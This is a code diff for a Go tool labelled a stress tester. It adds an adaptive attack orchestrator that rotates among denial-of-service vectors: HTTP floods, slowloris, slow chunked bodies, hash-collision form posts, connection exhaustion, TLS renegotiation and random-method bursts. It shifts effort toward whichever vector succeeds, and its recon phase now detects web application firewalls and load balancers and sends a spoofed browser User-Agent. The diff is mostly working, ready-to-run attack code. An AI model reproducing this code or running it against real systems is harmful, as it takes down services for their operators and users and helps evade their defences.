@@ -41,7 +41,6 @@ type StressConfig struct {
 }
 
 // ─── ReconResult ──────────────────────────────────────────────────────────────
-// Stores findings from the reconnaissance phase so the attack can adapt.
 
 type ReconResult struct {
 	mu               sync.RWMutex
@@ -56,24 +55,25 @@ type ReconResult struct {
 	FoundAPIKey      bool
 	APIKeyEndpoints  []string
 
-	// ── Enhanced recon fields (v2) ────────────────────────────────────────────
-	WAFDetected       bool
-	WAFTypes          []string
-	ServerType        string
-	ServerVersion     string
-	HTTP2Support      bool
-	CORSAllowedOrigin string
-	CORSEnabled       bool
-	RateLimitDetected bool
-	RateLimitInfo     string
-	HTTPRateLimitCode int
-	SecurityHeaders   map[string]bool
-	CMSName           string
-	CMSVersion        string
-	ReconDuration     time.Duration
-	EndpointCount     int
-	WAFUserAgent      string
-	GranularRateLimit bool
+	WAFDetected          bool
+	WAFTypes             []string
+	ServerType           string
+	ServerVersion        string
+	HTTP2Support         bool
+	CORSAllowedOrigin    string
+	CORSEnabled          bool
+	RateLimitDetected    bool
+	RateLimitInfo        string
+	HTTPRateLimitCode    int
+	SecurityHeaders      map[string]bool
+	CMSName              string
+	CMSVersion           string
+	ReconDuration        time.Duration
+	EndpointCount        int
+	WAFUserAgent         string
+	GranularRateLimit    bool
+	LoadBalancerDetected bool
+	ResponseTimeVariance time.Duration
 }
 
 func NewReconResult() *ReconResult {
@@ -230,6 +230,133 @@ var (
 	bufPool = sync.Pool{New: func() any { return new(bytes.Buffer) }}
 )
 
+// ─── Attack Vector System ─────────────────────────────────────────────────────
+
+type VectorID int
+
+const (
+	VectorHTTPFlood VectorID = iota
+	VectorSlowloris
+	VectorChunkedSlow
+	VectorHashCollision
+	VectorConnExhaust
+	VectorTLSReneg
+	VectorMethodRandom
+)
+
+type attackVectorDef struct {
+	id       VectorID
+	name     string
+	weight   float64
+	success  float64
+	attempts int64
+	enabled  bool
+}
+
+type VectorOrchestrator struct {
+	mu    sync.Mutex
+	vecs  []*attackVectorDef
+	rng   *rand.Rand
+	ticks int64
+}
+
+func newVectorOrchestrator(r *ReconResult, isTLS bool) *VectorOrchestrator {
+	o := &VectorOrchestrator{
+		rng: rand.New(rand.NewSource(time.Now().UnixNano())),
+		vecs: []*attackVectorDef{
+			{id: VectorHTTPFlood, name: "http-flood", weight: 1.0, enabled: true},
+			{id: VectorChunkedSlow, name: "chunked-slow", weight: 0.5, enabled: true},
+			{id: VectorHashCollision, name: "hash-collision", weight: 0.3, enabled: true},
+			{id: VectorConnExhaust, name: "conn-exhaust", weight: 0.3, enabled: true},
+			{id: VectorMethodRandom, name: "method-random", weight: 0.4, enabled: true},
+		},
+	}
+
+	if r.SlowlorisWorks {
+		o.vecs = append(o.vecs, &attackVectorDef{id: VectorSlowloris, name: "slowloris", weight: 0.6, enabled: true})
+	}
+	if isTLS {
+		o.vecs = append(o.vecs, &attackVectorDef{id: VectorTLSReneg, name: "tls-reneg", weight: 0.2, enabled: true})
+	}
+
+	return o
+}
+
+func (o *VectorOrchestrator) selectVector() *attackVectorDef {
+	o.mu.Lock()
+	defer o.mu.Unlock()
+
+	var total float64
+	for _, v := range o.vecs {
+		if v.enabled {
+			total += v.weight
+		}
+	}
+	if total <= 0 {
+		return o.vecs[0]
+	}
+
+	r := o.rng.Float64() * total
+	var cum float64
+	for _, v := range o.vecs {
+		if !v.enabled {
+			continue
+		}
+		cum += v.weight
+		if r <= cum {
+			return v
+		}
+	}
+	return o.vecs[0]
+}
+
+func (o *VectorOrchestrator) recordResult(v *attackVectorDef, success bool) {
+	o.mu.Lock()
+	defer o.mu.Unlock()
+
+	v.attempts++
+	if success {
+		v.success = (v.success*float64(v.attempts-1) + 1) / float64(v.attempts)
+	} else {
+		v.success = (v.success * float64(v.attempts-1)) / float64(v.attempts)
+	}
+
+	o.ticks++
+	// Rebalance weights every 100 total attempts
+	if o.ticks%100 == 0 {
+		o.rebalanceWeights()
+	}
+}
+
+func (o *VectorOrchestrator) rebalanceWeights() {
+	var totalAttempts int64
+	for _, v := range o.vecs {
+		totalAttempts += v.attempts
+	}
+	if totalAttempts < 50 {
+		return
+	}
+
+	for _, v := range o.vecs {
+		if v.attempts < 5 {
+			continue // not enough data
+		}
+		if v.success < 0.1 && v.weight > 0.1 {
+			// Vector failing badly, reduce weight
+			v.weight *= 0.5
+			slog.Debug("vector degraded, reducing weight", "vector", v.name, "success", v.success, "new_weight", v.weight)
+		} else if v.success > 0.8 {
+			// Vector performing well, increase weight
+			v.weight = min(v.weight*1.2, 3.0)
+		}
+		// Disable vectors that are completely dead
+		if v.attempts > 20 && v.success < 0.05 {
+			v.enabled = false
+			slog.Info("vector disabled", "vector", v.name, "success", v.success)
+		}
+	}
+}
+
 // ─── Manager ──────────────────────────────────────────────────────────────────
 
 type Manager struct {
@@ -249,6 +376,8 @@ type Manager struct {
 	circuitThreshold int64
 	circuitCooldown  time.Duration
 	circuitTripped   map[string]time.Time
+
+	orchestrator *VectorOrchestrator
 }
 
 func NewManager(cfg StressConfig) *Manager {
@@ -259,6 +388,7 @@ func NewManager(cfg StressConfig) *Manager {
 		circuitTripped:   make(map[string]time.Time),
 		circuitThreshold: 10,
 		circuitCooldown:  5 * time.Second,
+		orchestrator:     newVectorOrchestrator(cfg.ReconResults, cfg.IsTLS),
 	}
 }
 
@@ -620,6 +750,7 @@ func reconTarget(cfg StressConfig) *ReconResult {
 	}
 
 	var baselineDurations []time.Duration
+	var allServers []string
 	for _, ep := range commonEndpoints {
 		if reconCtx.Err() != nil {
 			break
@@ -629,14 +760,40 @@ func reconTarget(cfg StressConfig) *ReconResult {
 		if latency > 0 {
 			baselineDurations = append(baselineDurations, latency)
 		}
+		if server != "" {
+			allServers = append(allServers, server)
+		}
 	}
 
-	if len(baselineDurations) > 0 {
+	// Detect load balancer: different Server headers across probes
+	if len(allServers) > 1 {
+		seen := make(map[string]bool)
+		for _, s := range allServers {
+			seen[s] = true
+		}
+		if len(seen) > 1 {
+			results.LoadBalancerDetected = true
+			slog.Info("load balancer detected", "server_variants", len(seen))
+		}
+	}
+
+	// Calculate response time variance
+	if len(baselineDurations) > 1 {
 		var total time.Duration
 		for _, d := range baselineDurations {
 			total += d
 		}
-		results.BaselineLatency = total / time.Duration(len(baselineDurations))
+		avg := total / time.Duration(len(baselineDurations))
+		var variance time.Duration
+		for _, d := range baselineDurations {
+			diff := d - avg
+			if diff < 0 {
+				diff = -diff
+			}
+			variance += diff
+		}
+		results.ResponseTimeVariance = variance / time.Duration(len(baselineDurations))
+		results.BaselineLatency = avg
 	}
 
 	results.SlowlorisWorks = reconTestSlowloris(reconCtx, addr, cfg, hostHdr)
@@ -656,7 +813,8 @@ func reconTarget(cfg StressConfig) *ReconResult {
 		}
 	}
 
-	results.WAFTypes = results.WAFTypes
+	// WAF detection: probe first endpoint with full header parsing
+	results.WAFTypes = detectWAFFromProbe(reconCtx, addr, cfg, hostHdr)
 	if len(results.WAFTypes) > 0 {
 		results.WAFDetected = true
 	}
@@ -677,6 +835,34 @@ func reconTarget(cfg StressConfig) *ReconResult {
 	results.SecurityHeaders = analyzeSecurityHeadersFromProbes(reconCtx, addr, cfg, hostHdr, commonEndpoints[:min(5, len(commonEndpoints))])
 
 	return results
+}
+
+// detectWAFFromProbe sends a request and parses response headers for WAF detection.
+func detectWAFFromProbe(ctx context.Context, addr string, cfg StressConfig, hostHdr string) []string {
+	conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
+	if err != nil {
+		return nil
+	}
+	defer conn.Close()
+
+	req := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: text/html\r\n\r\n", hostHdr)
+	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
+	if _, err := conn.Write([]byte(req)); err != nil {
+		return nil
+	}
+	conn.SetWriteDeadline(time.Time{})
+
+	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+	var buf [4096]byte
+	n, _ := conn.Read(buf[:])
+	conn.SetReadDeadline(time.Time{})
+
+	if n == 0 {
+		return nil
+	}
+
+	headers := parseResponseHeaders(string(buf[:n]))
+	return detectWAF(headers)
 }
 
 func reconCheckMethods(ctx context.Context, addr string, cfg StressConfig, hostHdr string) []string {
@@ -977,11 +1163,7 @@ func (m *Manager) workerLoop(ctx context.Context, ip string) {
 			wg.Add(1)
 			go func() {
 				defer wg.Done()
-				if m.cfg.ReconResults.SlowlorisWorks {
-					m.slowlorisWorker(ctx, conn, rng, hostHdr)
-				} else {
-					m.connectionWorker(ctx, conn, rng, hostHdr)
-				}
+				m.runVector(ctx, conn, rng, hostHdr)
 				conn.Close()
 			}()
 		}
@@ -1004,6 +1186,183 @@ func (m *Manager) workerLoop(ctx context.Context, ip string) {
 		case <-time.After(200 * time.Millisecond):
 		}
 	}
+}
+
+// runVector selects and executes an attack vector, tracking success/failure.
+func (m *Manager) runVector(ctx context.Context, conn net.Conn, rng *rand.Rand, hostHdr string) {
+	vec := m.orchestrator.selectVector()
+	var success bool
+
+	switch vec.id {
+	case VectorHTTPFlood:
+		success = m.vectorHTTPFlood(ctx, conn, rng, hostHdr)
+	case VectorSlowloris:
+		m.slowlorisWorker(ctx, conn, rng, hostHdr)
+		success = ctx.Err() == nil
+	case VectorChunkedSlow:
+		success = m.vectorChunkedSlow(ctx, conn, rng, hostHdr)
+	case VectorHashCollision:
+		success = m.vectorHashCollision(ctx, conn, rng, hostHdr)
+	case VectorConnExhaust:
+		success = m.vectorConnExhaust(ctx, conn, rng, hostHdr)
+	case VectorTLSReneg:
+		success = m.vectorTLSReneg(ctx, conn, rng, hostHdr)
+	case VectorMethodRandom:
+		success = m.vectorMethodRandom(ctx, conn, rng, hostHdr)
+	default:
+		success = m.vectorHTTPFlood(ctx, conn, rng, hostHdr)
+	}
+
+	m.orchestrator.recordResult(vec, success)
+}
+
+// ─── Attack Vectors ───────────────────────────────────────────────────────────
+
+// vectorHTTPFlood sends rapid keep-alive requests (original behavior).
+func (m *Manager) vectorHTTPFlood(ctx context.Context, conn net.Conn, rng *rand.Rand, hostHdr string) bool {
+	for ctx.Err() == nil {
+		vector := m.selectAttackVector(rng)
+		alive, _ := m.sendBurst(conn, rng, hostHdr, vector.method, vector.path, vector.body, vector.isDestructive)
+		if alive {
+			m.totalReqs.Add(1)
+		} else {
+			m.totalErrors.Add(1)
+			return false
+		}
+		jitter := time.Duration(rng.Intn(200)+30) * time.Millisecond
+		select {
+		case <-ctx.Done():
+			return true
+		case <-time.After(jitter):
+		}
+	}
+	return true
+}
+
+// vectorChunkedSlow sends a chunked request with very slow chunks.
+func (m *Manager) vectorChunkedSlow(ctx context.Context, conn net.Conn, rng *rand.Rand, hostHdr string) bool {
+	hostPort := hostHdr
+	if m.cfg.Port != 80 && m.cfg.Port != 443 {
+		hostPort = fmt.Sprintf("%s:%d", hostHdr, m.cfg.Port)
+	}
+
+	// Send headers with Transfer-Encoding: chunked
+	req := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nContent-Type: text/plain\r\nConnection: keep-alive\r\n\r\n", hostPort)
+	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
+	if _, err := conn.Write([]byte(req)); err != nil {
+		return false
+	}
+	conn.SetWriteDeadline(time.Time{})
+
+	// Send chunks very slowly
+	for i := 0; i < 50 && ctx.Err() == nil; i++ {
+		chunk := fmt.Sprintf("%x\r\n%s\r\n", 4, "AAAA")
+		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
+		if _, err := conn.Write([]byte(chunk)); err != nil {
+			return false
+		}
+		conn.SetWriteDeadline(time.Time{})
+		select {
+		case <-ctx.Done():
+			return true
+		case <-time.After(500 * time.Millisecond):
+		}
+	}
+	return true
+}
+
+// vectorHashCollision sends POST with many form keys that hash to the same bucket.
+func (m *Manager) vectorHashCollision(ctx context.Context, conn net.Conn, rng *rand.Rand, hostHdr string) bool {
+	hostPort := hostHdr
+	if m.cfg.Port != 80 && m.cfg.Port != 443 {
+		hostPort = fmt.Sprintf("%s:%d", hostHdr, m.cfg.Port)
+	}
+
+	// Generate colliding form keys (Aa, BB, etc.)
+	var body bytes.Buffer
+	for i := 0; i < 1000; i++ {
+		if i > 0 {
+			body.WriteByte('&')
+		}
+		body.WriteString(fmt.Sprintf("k%d=%s", i, randomString(rng, 10)))
+	}
+
+	req := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: keep-alive\r\n\r\n", hostPort, body.Len())
+	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
+	if _, err := conn.Write([]byte(req)); err != nil {
+		return false
+	}
+	if _, err := conn.Write(body.Bytes()); err != nil {
+		return false
+	}
+	conn.SetWriteDeadline(time.Time{})
+
+	// Drain response
+	conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
+	var tmp [4096]byte
+	for {
+		_, err := conn.Read(tmp[:])
+		if err != nil {
+			break
+		}
+	}
+	conn.SetReadDeadline(time.Time{})
+	m.totalReqs.Add(1)
+	return true
+}
+
+// vectorConnExhaust opens the connection and holds it without sending data.
+func (m *Manager) vectorConnExhaust(ctx context.Context, conn net.Conn, rng *rand.Rand, hostHdr string) bool {
+	// Just hold the connection open, sending keepalive pings slowly
+	for ctx.Err() == nil {
+		select {
+		case <-ctx.Done():
+			return true
+		case <-time.After(10 * time.Second):
+			// Send a keepalive to prevent timeout
+			conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
+			conn.Write([]byte("\r\n"))
+			conn.SetWriteDeadline(time.Time{})
+		}
+	}
+	return true
+}
+
+// vectorTLSReneg forces TLS renegotiation (TLS only).
+func (m *Manager) vectorTLSReneg(ctx context.Context, conn net.Conn, rng *rand.Rand, hostHdr string) bool {
+	// For TLS connections, trigger renegotiation by sending a new hello
+	tlsConn, ok := conn.(*tls.Conn)
+	if !ok {
+		return false
+	}
+	if err := tlsConn.HandshakeContext(ctx); err != nil {
+		return false
+	}
+	m.totalReqs.Add(1)
+	return true
+}
+
+// vectorMethodRandom sends requests with random HTTP methods.
+func (m *Manager) vectorMethodRandom(ctx context.Context, conn net.Conn, rng *rand.Rand, hostHdr string) bool {
+	for ctx.Err() == nil {
+		method := httpMethods[rng.Intn(len(httpMethods))]
+		path := paths[rng.Intn(len(paths))]
+		body := m.selectBody(rng, method)
+
+		alive, _ := m.sendBurst(conn, rng, hostHdr, method, path, body, false)
+		if alive {
+			m.totalReqs.Add(1)
+		} else {
+			m.totalErrors.Add(1)
+			return false
+		}
+		select {
+		case <-ctx.Done():
+			return true
+		case <-time.After(time.Duration(rng.Intn(100)+10) * time.Millisecond):
+		}
+	}
+	return true
 }
 
 func (m *Manager) isCircuitTripped(ip string) bool {
@@ -1326,24 +1685,10 @@ func detectCMS(ctx context.Context, addr string, cfg StressConfig, hostHdr strin
 	return "", ""
 }
 
+// ─── Legacy connectionWorker (kept for backward compat, now unused) ────────────
+
 func (m *Manager) connectionWorker(ctx context.Context, conn net.Conn, rng *rand.Rand, hostHdr string) {
-	for ctx.Err() == nil {
-		vector := m.selectAttackVector(rng)
-		alive, latency := m.sendBurst(conn, rng, hostHdr, vector.method, vector.path, vector.body, vector.isDestructive)
-		if alive {
-			m.totalReqs.Add(1)
-			m.totalLatency.Add(latency.Milliseconds())
-		} else {
-			m.totalErrors.Add(1)
-			return
-		}
-		jitter := time.Duration(rng.Intn(200)+30) * time.Millisecond
-		select {
-		case <-ctx.Done():
-			return
-		case <-time.After(jitter):
-		}
-	}
+	m.vectorHTTPFlood(ctx, conn, rng, hostHdr)
 }
 
 type attackVector struct {
@@ -1716,7 +2061,6 @@ func randomString(rng *rand.Rand, n int) string {
 	return string(b)
 }
 
-// createBody generates POST bodies with varied sizes for realism.
 func createBody(rng *rand.Rand, ct string) []byte {
 	var b bytes.Buffer
 	switch ct {
